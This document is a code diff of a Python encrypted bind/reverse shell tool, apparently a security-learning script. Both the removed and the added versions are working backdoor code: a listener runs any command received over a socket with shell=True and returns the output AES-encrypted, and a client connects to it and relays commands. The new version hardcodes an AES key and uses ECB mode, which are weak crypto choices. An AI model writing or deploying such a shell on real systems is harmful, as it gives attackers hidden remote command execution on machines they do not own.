@@ -1,117 +1,84 @@
-import socket, subprocess, threading, argparse,os
-
+import socket, subprocess, threading, argparse
 from Crypto.Cipher import AES
-from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad, unpad
+from Crypto.Random import get_random_bytes
 
-PORT=4444
-MAX_BUFFER=4096
+DEFAULT_PORT = 1234
+MAX_BUFFER = 4096
+# The secret key used for encryption and decryption.
+SECRET_KEY = b'T\xc0H\xf0T\x92\xc6\xc8\xeb\xe2\xfc9Q;\xd0f'
 
 class AESCipher:
-    def __init__(self, key):
-        self.key = key if key else get_random_bytes(32)
-        self.cipher = AES.new(self.key, AES.MODE_CBC)
+    def __init__(self, key=None):
+        self.key = key if key else SECRET_KEY
+        self.cipher = AES.new(self.key, AES.MODE_ECB)
+
+    def encrypt(self, plaintext):
+        return self.cipher.encrypt(pad(plaintext, AES.block_size))
+
+    def decrypt(self, encrypted):
+        return unpad(self.cipher.decrypt(encrypted), AES.block_size)
     
-    def encrypt(self, data):
-        return self.cipher.encrypt(pad(data, AES.block_size))
-    def decrypt(self, data):
-        return unpad(self.cipher.decrypt(bytearray.fromhex(data)), AES.block_size)
-    def __str__(self):
+    def __str__(self) -> str:
         return "Key -> {}".format(self.key.hex())
-
-
-
-def encrypted_send(s,msg):
-    s.send(cipher.encrypt(msg))
 
 def execute_cmd(cmd):
     try:
-        output = subprocess.check_output("cmd /c {}".format(cmd),stderr=subprocess.STDOUT, shell=True)
-
+        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
     except:
-        output = b"Command failed"
+        output = b'[-] Command failed'
     return output
 
-
-def decode_and_strip(s):
-    return s.decode("latin-1").strip()
-
-def shell_thread(s):
-    encrypted_send(s,b"[ -- Connected! --]")
-    try:
-        while True:
-            encrypted_send(s,b"\r\nEnter Command> ")
-            data = s.recv(MAX_BUFFER)
-            if data:
-                buffer = cipher.decrypt(decode_and_strip(data))
-                buffer = decode_and_strip(buffer)
-                if not buffer or buffer == "exit":
-                    s.close()
-                    exit()
-
-            print("Executing command: {} ".format(buffer))
-            encrypted_send(s,execute_cmd(buffer))
-    except:
-        s.close()
-        exit()
-
-def send_thread(s):
-    try:
-        while True:
-            data = input() + "\n"
-            if data:
-                encrypted_send(s,data.encode("latin-1"))
-    except:
-        s.close()
-        exit()
-
-def receive_thread(s):
-    try:
-        while True:
-            data = decode_and_strip(s.recv(MAX_BUFFER))
-            if data:
-                data = cipher.decrypt(data).decode("latin-1")
-                print(data, end="",flush=True)
-
-    except:
-        s.close()
-        exit()
-
-def server(ip,port):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind((ip, int(port)))
-    s.listen()
-
-    print("[-- Starting Bind Shell --]")
+def shell_thread(my_socket, my_cipher):
+    my_socket.send(my_cipher.encrypt(b"[+]Connected \n"))
+    
     while True:
-        client, addr = s.accept()
-        print("[ -- New User connected! -- ]".format(addr))
-        threading.Thread(target=shell_thread, args=(client,)).start()
+        data = my_socket.recv(MAX_BUFFER)
+        if data:
+            buffer = my_cipher.decrypt(data).decode("utf-8")
+            if not buffer or buffer == "exit":
+                my_socket.close()
+                exit()
+            output = execute_cmd(buffer)
+            my_socket.send(my_cipher.encrypt(output))
 
-def client(ip,port):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((ip, int(port)))
-    print("[-- Connecting Reverse Shell --]")
-    threading.Thread(target=send_thread, args=(s,)).start()
-    threading.Thread(target=receive_thread, args=(s,)).start()
+def recv_thread(my_socket, my_cipher):
+    while True:
+        data = my_cipher.decrypt(my_socket.recv(MAX_BUFFER)).decode("utf-8")
+        if data:
+            print("\n" + data, end="", flush=True)
 
-parser = argparse.ArgumentParser(description="Simple Python Bind/Reverse Shell")
-parser.add_argument("-l", "--listen",  help="Listen for incoming connections")
-parser.add_argument("-p", "--port",  help="Port to use")
-parser.add_argument("-c", "--connect", help="IP address to connect to")
-parser.add_argument("-k", "--key", help="AES Key", required=False)
-args = parser.parse_args()
+def send_thread(my_socket, my_cipher):
+    while True:
+        data = input() + "\n"
+        my_socket.send(my_cipher.encrypt(data.encode()))
 
-if args.connect and not args.key:
-    parser.error("-c CONNECT requires -k KEY.")
+def server():
+    my_cipher = AESCipher()
+    my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    my_socket.bind(("127.0.0.1", DEFAULT_PORT))
+    my_socket.listen()
+    print("[+] Starting bindshell")
+    while True:
+        client_socket, addr = my_socket.accept()
+        threading.Thread(target=shell_thread, args=(client_socket, my_cipher)).start()
 
-if args.key:
-    cipher = AESCipher(bytearray.fromhex(args.key))
-else:
-    cipher = AESCipher(None)
-print(cipher)
+def client(ip):
+    my_cipher = AESCipher()
+    client_socet = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client_socet.connect((ip, DEFAULT_PORT))
+    threading.Thread(target=send_thread, args=(client_socet, my_cipher)).start()
+    threading.Thread(target=recv_thread, args=(client_socet, my_cipher)).start()
 
-if args.listen:
-    server(args.listen,args.port)
-elif args.connect:
-    client(args.connect,args.port)
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-l", "--listen", action="store_true", help="Setup a bind shell", required=False)
+    parser.add_argument("-c", "--connect", help="Connect to a bind shell", required=False)
+    args = parser.parse_args()
+    if args.listen:
+        server()
+    elif args.connect:
+        client(args.connect)
+
+if __name__ == '__main__':
+    main()
